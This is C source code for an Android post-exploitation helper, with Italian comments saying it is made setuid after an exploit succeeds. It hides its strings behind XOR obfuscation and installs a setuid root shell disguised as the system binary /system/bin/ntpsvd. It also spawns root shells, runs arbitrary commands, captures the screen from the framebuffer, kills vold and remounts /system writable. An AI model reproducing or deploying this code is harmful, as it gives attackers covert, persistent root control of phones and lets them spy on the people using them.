//#define DEBUG

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <math.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/system_properties.h>
#include <errno.h>
#include <jni.h>
#include <android/log.h>
#include <dirent.h>
#include <linux/reboot.h>
#include <linux/fb.h>
#include <linux/kd.h>

#ifdef DEBUG
#warning "Debug mode is enabled, errors will be printed to stdout"
#define LOG(x)  printf(x)
#else
#define LOG(x) ;
#endif

static int copy(const char *from, const char *to);
unsigned int getProcessId(const char *p_processname);
int setgod();
void sync_reboot();
int remount(const char *mntpoint, int flags);
int my_mount(const char *mntpoint);
void my_chown(const char *user, const char *group, const char *file);
void my_chmod(const char *mode, const char *file); 
static void copy_root(const char *mntpnt, const char *dst);
static void delete_root(const char *mntpnt, const char *dst);
//static int get_framebuffer(char *filename);
static unsigned char* deobfuscate(unsigned char *s);

// questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
// statuslog -c "/system/bin/cat /dev/graphics/fb0"
int main(int argc, char** argv) {
	unsigned char fb[] = "\x3b\x23\x1a\xa3\x5f"; // "fb"
	unsigned char fb0[] = "\xd3\x05\xc7\x04\xb9\xbe\xaf\x04\xbc\xa3\xb2\xad\xc5\xba\xb0\xa0\x04\xbf\xb3\xed"; // "/dev/graphics/fb0"
	unsigned char vol[] = "\x4e\xde\x93\xc8\x21\xde"; // "vol"
	unsigned char vold1[] = "\x0b\xda\xd5\x8d\xe4\x9b\x93"; // "vold"
	unsigned char vold2[] = "\xcc\x74\xbc\x5a\x63\x60\x68"; // "vold"
	unsigned char reb[] = "\x2c\x97\xb8\x62\x77\x72"; // "reb"
	unsigned char blr[] = "\xf4\x61\x96\x96\x98\x86"; // "blr"
	unsigned char blw[] = "\x50\x1e\x4d\x4e\x44\x5b"; // "blw"
	unsigned char rt[] = "\x04\x16\x10\x9a\x90"; // "rt"
	unsigned char system1[] = "\x63\xfa\x9e\xbc\xf0\xee\xf0\xeb\xfa\xf2"; // "/system"
	unsigned char system2[] = "\xa2\xf5\x50\x77\x33\x25\x33\x3e\x49\x31"; // "/system"
	unsigned char system3[] = "\xd9\x65\xbb\x3e\x6a\x60\x6a\x77\x44\x7c"; // "/system"
	unsigned char system4[] = "\xca\xa3\x6e\x2b\xff\xf5\xff\xc2\xf1\xe9"; // "/system"
	unsigned char mntsdcard[] = "\xa4\x98\x37\xbb\xf9\xfa\xf0\xbb\xf7\xc0\xc7\xc5\xf6\xc0"; // "/mnt/sdcard"
	unsigned char ntpsvd1[] = "\xab\x7b\xc2\x84\x28\x36\x28\x21\x32\x3a\x84\x3f\x46\x3b\x84\x3b\x21\x2d\x28\x23\x31"; // "/system/bin/ntpsvd"
	unsigned char ntpsvd2[] = "\x2d\xfd\xc2\x02\xa6\xac\xa6\xab\xb8\xc0\x02\xb1\xbc\xbd\x02\xbd\xab\xa7\xa6\xa5\xbb"; // "/system/bin/ntpsvd"
	unsigned char sd[] = "\x2d\xcf\xe0\xe2\xd7"; // "sd"
	unsigned char ru[] = "\x2c\xb1\x9f\xbe\xbb"; // "ru"
	unsigned char air[] = "\x9b\xc5\x5d\x7a\x72\x6b"; // "air"
	unsigned char qzx[] = "\x04\x52\x55\x95\x82\x9c"; // "qzx"
	unsigned char fhc[] = "\x68\x87\xec\x12\x00\x15"; // "fhc"
	unsigned char fho[] = "\xa0\x46\xe5\x4a\x48\x53"; // "fho"
	unsigned char pzm[] = "\x2d\x7a\x54\xad\xab\xc0"; // "pzm"
	unsigned char qzs[] = "\x17\xc1\xd5\xe6\xef\xe4"; // "qzs"
	unsigned char binsh1[] = "\xdf\x14\xc5\x10\xd4\xae\xd4\xab\xda\xd2\x10\xc5\xde\xd1\x10\xd4\xdf"; // "/system/bin/sh"
	unsigned char binsh2[] = "\x0b\xeb\xee\xe4\x88\xb6\x88\x81\xb2\xba\xe4\xbf\xa6\xbb\xe4\x88\xa5"; // "/system/bin/sh"
	unsigned char sh[] = "\x6a\xe2\x8a\x19\x06"; // "sh"
	
	int i;
	unsigned char *da, *db;
	
	if (argc < 2) {
		LOG("Usage: ");
		LOG(argv[0]);
		LOG(" <command>\n");
		LOG("fb - try to capture a screen snapshot\n");
		LOG("vol - kill VOLD twice\n");
		LOG("reb - reboot the phone\n");
		LOG("blr - mount /system in READ_ONLY\n");
		LOG("blw - mount /system in READ_WRITE\n");
		LOG("rt - install the root shell in /system/bin/ntpsvd\n");
		LOG("ru - remove the root shell from /system/bin/ntpsvd\n");
		LOG("sd - mount /sdcard\n");
		LOG("air - check if the shell has root privileges\n");
		LOG("qzx \"command\" - execute the given commandline\n");
		LOG("fhc <src> <dest> - copy <src> into <dst>\n");
		LOG("fho <user> <group> <file> - chown <file> to <user>:<group>\n");
		LOG("pzm <newmode> <file> - chmod <file> to <newmode>\n");
		LOG("qzs - start a root shell\n");
		
		return 0;
	}
	
	setgod();
	
	// Cattura uno screenshot
	if (strcmp(argv[1], deobfuscate(fb)) == 0 && argc == 3) {
		LOG("Capturing a screenshot\n");
		char* filename = argv[2];

		copy(deobfuscate(fb0), filename);
		chmod(filename, 0666);
	} else if (strcmp(argv[1], deobfuscate(vol)) == 0) { // Killa VOLD per due volte
		unsigned int pid;
		
		LOG("Killing VOLD\n");

		for (i = 0; i < 2; i++) {
			pid = getProcessId(deobfuscate(vold1));

			if (pid) {
				kill(getProcessId(deobfuscate(vold2)), SIGKILL);
				sleep(2);
			}	
		}
	} else if (strcmp(argv[1], deobfuscate(reb)) == 0) { // Reboot
		LOG("Rebooting...\n");

		sync_reboot();
	} else if (strcmp(argv[1], deobfuscate(blr)) == 0) { // Monta /system in READ_ONLY
		LOG("Mounting FS read only\n");
		remount(deobfuscate(system1), MS_RDONLY);
	} else if (strcmp(argv[1], deobfuscate(blw)) == 0) { // Monta /system in READ_WRITE
		LOG("Mounting FS read write\n");
		remount(deobfuscate(system2), 0);
	} else if (strcmp(argv[1], deobfuscate(rt)) == 0) {  // Copia la shell root in /system/bin/ntpsvd
		LOG("Installing suid shell\n");
		copy_root(deobfuscate(system3), deobfuscate(ntpsvd1));
	} else if (strcmp(argv[1], deobfuscate(ru)) == 0) {  // Cancella la shell root in /system/bin/ntpsvd
		LOG("Removing suid shell\n");
		delete_root(deobfuscate(system4), deobfuscate(ntpsvd2));
	} else if (strcmp(argv[1], deobfuscate(sd)) == 0) {  // Mount /sdcard
		LOG("Mounting /sdcard\n");
		my_mount(deobfuscate(mntsdcard));
	} else if (strcmp(argv[1], deobfuscate(air)) == 0) { // Am I Root?
		LOG("Are we root?\n");
		return setgod();
	} else if (strcmp(argv[1], deobfuscate(qzx)) == 0) { // Eseguiamo la riga passataci
		LOG("Executing provided command\n");
		return system(argv[2]);
	} else if (strcmp(argv[1], deobfuscate(fhc)) == 0) { // Copiamo un file nel path specificato dal secondo argomento 
		LOG("Copying file to destination folder\n");
		copy(argv[2], argv[3]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(fho)) == 0) { // chown: user group file
		LOG("Chowning file\n");
		my_chown(argv[2], argv[3], argv[4]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(pzm)) == 0) { // chmod: newmode file
		LOG("Chmodding file\n");
		my_chmod(argv[2], argv[3]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(qzs)) == 0) { // Eseguiamo una root shell
		const char * shell = deobfuscate(binsh1);
		LOG("Starting root shell\n");

		int i;
		char *exec_args[argc + 1];
		exec_args[argc] = NULL;
		exec_args[0] = deobfuscate(sh);

		for (i = 1; i < argc; i++) {
			exec_args[i] = argv[i];
		}

		execv(deobfuscate(binsh2), exec_args);

		LOG("Exiting shell\n");
	}

	return 0;
}

// Returned pointer pointer must be freed by the caller
// Al momento le free() non vengono MAI chiamate perche' tutti i comandi sono one-shot
// E' zozza ma almeno non triplichiamo tutte le righe di codice e cmq il processo non
// resta mai attivo.
unsigned char* deobfuscate(unsigned char *s) {
    unsigned char key, mod, len;
    int i, j;
	unsigned char* d;
	
    key = s[0];
    mod = s[1];
    len = s[2] ^ key ^ mod;

	d = (unsigned char *)malloc(len + 1);
	
    // zero terminate the string
    memset(d, 0x00, len + 1);

    for (i = 0, j = 3; i < len; i++, j++) {
        d[i] = s[j] ^ mod;
        d[i] -= mod;
        d[i] ^= key;
    }

    d[len] = 0;
	
    return d;
}

// Allo stato attuale, la copy funziona meglio... Questa funzione non e' usata
// Come referenza futura: http://www.pocketmagic.net/?p=1473
/*static int get_framebuffer(char *filename) {
	unsigned char fb0[] = "\xef\x1c\xe2\xc0\xbb\xba\xa9\xc0\xb8\xa5\xb6\xa7\xbf\xbe\xb4\xa4\xc0\xb9\xb5\xe7"; // "/dev/graphics/fb0"
	
	int fd, fd_out;
	void *bits;
	struct fb_var_screeninfo vi;
	struct fb_fix_screeninfo fi;
	ssize_t written;

	fd = open(deobfuscate(fb0), O_RDONLY);

	if (fd < 0) {
		//perror("cannot open fb0");
		return 0;
	}

	if (ioctl(fd, FBIOGET_FSCREENINFO, &fi) < 0) {
		//perror("failed to get fb0 info");
		return 0; 
	}

	if (ioctl(fd, FBIOGET_VSCREENINFO, &vi) < 0) {
		//perror("failed to get fb0 info");
		return 0;
	}


	bits = mmap(0, fi.smem_len, PROT_READ, MAP_PRIVATE, fd, 0);

	if (bits == MAP_FAILED) {
		//perror("failed to mmap framebuffer");
		return 0;
	}


	fd_out = open(filename, O_CREAT | O_RDWR);

	if (fd_out < 0) {
		//perror("failed to create frame file");
		return 0;
	}

	written = write(fd_out, bits, fi.smem_len);

	if (written <= 0) {
		//perror("cannot write to file");
		return 0;
	}

	close(fd);
	close(fd_out);

	return 0;

	fb->version = sizeof(*fb);
	fb->width = vi.xres;
	fb->height = vi.yres;
	fb->stride = fi.line_length / (vi.bits_per_pixel >> 3);
	fb->data = bits;
	fb->format = GGL_PIXEL_FORMAT_RGB_565;

	fb++;

	fb->version = sizeof(*fb);
	fb->width = vi.xres;
	fb->height = vi.yres;
	fb->stride = fi.line_length / (vi.bits_per_pixel >> 3);
	fb->data = (void*) (((unsigned) bits) + vi.yres * vi.xres * 2);
	fb->format = GGL_PIXEL_FORMAT_RGB_565;

	return fd;
}*/

void my_chmod(const char *mode, const char *file) {
	unsigned char o[] = "\xa0\xf6\x54\x8d\x33"; // "%o"
	
	int newmode;

	sscanf(mode, deobfuscate(o), &newmode);
	chmod(file, newmode);
}

void my_chown(const char *user, const char *group, const char *file) {
	unsigned char chown1[] = "\x5a\x44\x0c\xfd\x29\x23\x29\x36\xc7\x3f\xfd\x38\x33\x3c\xfd\x39\x32\x3d\x35\x3c\xfa"; // "/system/bin/chown "
	unsigned char chown2[] = "\x38\x07\x25\x19\x55\x4f\x55\x54\x63\x5b\x19\x66\x5f\x5a\x19\x65\x50\x59\x51\x5a\x18\x23\x55\x1a\x23\x55\x18\x23\x55"; // "/system/bin/chown %s.%s %s"
	
	char *buf;
	int len = strlen(user) + strlen(group) + strlen(file) + 
				strlen(deobfuscate(chown1)) + 5;

	buf = (char *)malloc(len);

	if (buf == NULL) {
		return;
	}

	memset(buf, 0, len);

	sprintf(buf, deobfuscate(chown2), user, group, file);
	system(buf);

	free(buf);
	return; 
}

static void delete_root(const char *mntpnt, const char *dst) {
	if (mntpnt != NULL)
		remount(mntpnt, 0);

	unlink(dst);

	if (mntpnt != NULL)
		remount(mntpnt, MS_RDONLY);
		
	LOG("Suid shell removed\n");
}

static void copy_root(const char *mntpnt, const char *dst) {
	unsigned char exe[] = "\x2f\xbb\x9a\x00\xa1\xa3\x40\xbc\x00\xac\xbe\x45\xbf\x00\xbe\xa9\xbe"; // "/proc/self/exe"
	
	if (mntpnt != NULL)
		remount(mntpnt, 0);

	copy(deobfuscate(exe), dst);
	chown(dst, 0, 0);
	chmod(dst, 04755);

	if (mntpnt != NULL)
		remount(mntpnt, MS_RDONLY);
}

static int copy(const char *from, const char *to) {
	int fd1, fd2;
	char buf[0x1000];
	int r = 0;

	if ((fd1 = open(from, O_RDONLY)) < 0) {
		LOG("Unable to open source file\n");
		return -1;
	}

	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
		LOG("Unable to open destination file\n");
		close(fd1);
		return -1;
	}

	for (;;) {
		r = read(fd1, buf, sizeof(buf));

		if (r <= 0)
			break;

		if (write(fd2, buf, r) != r)
			break;
	}

	close(fd1);
	close(fd2);

	sync();
	sync();

	return r;
}

unsigned int getProcessId(const char *p_processname) {
	unsigned char proc1[] = "\xa4\x08\xaa\x9b\xd4\xd6\xdb\xc7\x9b"; // "/proc/"
	unsigned char numbers[] = "\x7d\x9b\xec\x73\x7c\x71\x72\x7f\x78\x7d\x7e\x7b\x44"; // "0123456789"
	unsigned char proc2[] = "\x2f\xe1\xc8\x00\xa1\xdf\xc0\xcc\x00"; // "/proc/"
	unsigned char slash[] = "\x45\x50\x14\xea"; // "/"
	unsigned char exe[] = "\x7f\x53\x2f\x3e\x09\x3e"; // "exe"
	
    DIR *dir_p;
    struct dirent *dir_entry_p;
    char dir_name[128];
    char target_name[252];
    int target_result;
    char exe_link[252];
    int errorcount;
    int result;
	
#ifdef DEBUG
    char msg[256];
#endif

    errorcount = 0;
    result = 0;

    dir_p = opendir(deobfuscate(proc1));

    while (NULL != (dir_entry_p = readdir(dir_p))) {
        if (strspn(dir_entry_p->d_name, deobfuscate(numbers)) == strlen(dir_entry_p->d_name)) {
            strcpy(dir_name, deobfuscate(proc2));
            strcat(dir_name, dir_entry_p->d_name);
            strcat(dir_name, deobfuscate(slash));

            exe_link[0] = 0;
            strcat(exe_link, dir_name);
            strcat(exe_link, deobfuscate(exe));
            target_result = readlink(exe_link, target_name, sizeof(target_name) - 1);

            if (target_result > 0) {
                target_name[target_result] = 0;

                if (strstr(target_name, p_processname) != NULL) {
                    result = atoi(dir_entry_p->d_name);

#ifdef DEBUG
                    sprintf(msg, "getProcessID(%s) id = %d\n", p_processname, result);
                    LOG(msg);
#endif

                    closedir(dir_p);
                    return result;
                }
            }
        }
    }

    closedir(dir_p);

#ifdef DEBUG
    sprintf(msg, "getProcessID(%s) id = 0 (could not find process)\n", p_processname);
    LOG(msg);
#endif

    return result;
}

void sync_reboot() {
#ifdef DEBUG
	char buf[256];
#endif

	sync();

	if (reboot(LINUX_REBOOT_CMD_RESTART) < 0) {
#ifdef DEBUG
		sprintf(buf, "Error rebooting: %d\n", errno);
		LOG(buf);
#endif
	}
}

int remount(const char *mntpoint, int flags) {
	unsigned char mounts[] = "\x84\xe0\x68\x6b\x34\x36\x2b\x27\x6b\x29\x2b\x31\x2a\x30\x37"; // "/proc/mounts"
	unsigned char r[] = "\x19\xfe\xe6\x97"; // "r"
	unsigned char t1[] = "\x65\x5f\x39\xfb\xc7\x2f"; // " \t"
	unsigned char t2[] = "\x5e\x42\x1f\x82\x06\x2e"; // " \t"
	unsigned char t3[] = "\x3a\xb4\x8d\x7a\xae\xb6"; // " \t"

    FILE *f = NULL;
    int found = 0;
    char buf[1024], *dev = NULL, *fstype = NULL;

    if ((f = fopen(deobfuscate(mounts), deobfuscate(r))) == NULL) {
		LOG("Unable to open /proc/mounts\n");
        return -1;
    }

    memset(buf, 0, sizeof(buf));

    for (;!feof(f);) {
        if (fgets(buf, sizeof(buf), f) == NULL)
            break;

        if (strstr(buf, mntpoint)) {
            found = 1;
            break;
        }
    }

    fclose(f);

    if (!found) {
		LOG("Cannot find mountpoint: ");
		LOG(mntpoint);
		LOG("\n");
		
        return -1;
    }

    if ((dev = strtok(buf, deobfuscate(t1))) == NULL) {
		LOG("Cannot find first mount entry\n");
        return -1;
    }

    if (strtok(NULL, deobfuscate(t2)) == NULL) {
		LOG("Cannot find second mount entry\n");
        return -1;
    }

    if ((fstype = strtok(NULL, deobfuscate(t3))) == NULL) {
		LOG("Cannot find third mount entry\n");
        return -1;
    }

    return mount(dev, mntpoint, fstype, flags | MS_REMOUNT, 0);
}

int my_mount(const char *mntpoint) {
	unsigned char t1[] = "\xc6\x99\x5c\xe6\xaa\xd2"; // " \t"
	unsigned char t2[] = "\x95\x0e\x98\xcd\xd9\xe1"; // " \t"
	unsigned char t3[] = "\x32\x19\x28\x32\x9e\x46"; // " \t"
	unsigned char mounts[] = "\x4e\x10\x52\x61\x5e\x5c\x21\x2d\x61\x23\x21\x5b\x20\x5a\x5d"; // "/proc/mounts"
	unsigned char r[] = "\x92\xaf\x3c\x20"; // "r"

    FILE *f = NULL;
    int found = 0;
    char buf[1024], *dev = NULL, *fstype = NULL;

    if ((f = fopen(deobfuscate(mounts), deobfuscate(r))) == NULL) {
		LOG("Unable to open /proc/mounts\n");
        return -1;
    }

    memset(buf, 0, sizeof(buf));

    for (;!feof(f);) {
        if (fgets(buf, sizeof(buf), f) == NULL)
            break;

        if (strstr(buf, mntpoint)) {
            found = 1;
            break;
        }
    }

    fclose(f);

    if (!found) {
		LOG("Cannot find mountpoint\n");
        return -1;
    }

    if ((dev = strtok(buf, deobfuscate(t1))) == NULL) {
		LOG("Cannot find first mount entry\n");
        return -1;
    }

    if (strtok(NULL, deobfuscate(t2)) == NULL) {
		LOG("Cannot find second mount entry\n");
        return -1;
    }

    if ((fstype = strtok(NULL, deobfuscate(t3))) == NULL) {
		LOG("Cannot find third mount entry\n");
        return -1;
    }

    return mount(dev, mntpoint, fstype, 0, 0);
}

int setgod() {
#ifdef DEBUG
    char buf[256];
    //sprintf(buf, "Actuald UID: %d, GID: %d, EUID: %d, EGID: %d\n", getuid(), getgid(), geteuid(), getegid());
	//LOG("Getting root privileges\n");
	//LOG(buf);
#endif

    setegid(0);
    setuid(0);
    setgid(0);
    seteuid(0);

#ifdef DEBUG
    sprintf(buf, "Actual UID: %d, GID: %d, EUID: %d, EGID: %d, err: %d\n", getuid(), getgid(), geteuid(), getegid(), errno);
	LOG(buf);
#endif

    return (seteuid(0) == 0) ? 1 : 0;
}
